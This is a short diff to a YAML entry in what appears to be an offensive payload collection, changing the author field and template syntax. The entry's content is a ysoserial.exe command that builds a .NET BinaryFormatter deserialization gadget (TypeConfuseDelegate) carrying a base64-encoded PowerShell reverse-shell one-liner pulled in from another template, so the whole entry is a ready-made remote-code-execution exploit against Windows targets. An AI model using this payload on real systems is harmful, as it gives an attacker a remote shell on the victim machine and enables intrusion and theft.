@@ -3,7 +3,7 @@ metadata:
   filename: "revshell-deserialization-ysoserial-net-binary.yaml"
   tags: ["windows", "shell"]
   created: "2025-07-09"
-  author: "@Anakles"
+  authors: ["@Anakles"]
 
 content: |
-  <%=$(esh variables/delivery_path_windows)%>\Release\ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "<%=$(esh payloads/revshell-windows-powershell-oneliner-base64encoded)%>" -o <raw|base64>
+  {{ delivery_path_windows }}\Release\ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "{{ include('payloads/revshell-windows-powershell-oneliner-base64encoded.yaml') }}" -o <raw|base64>
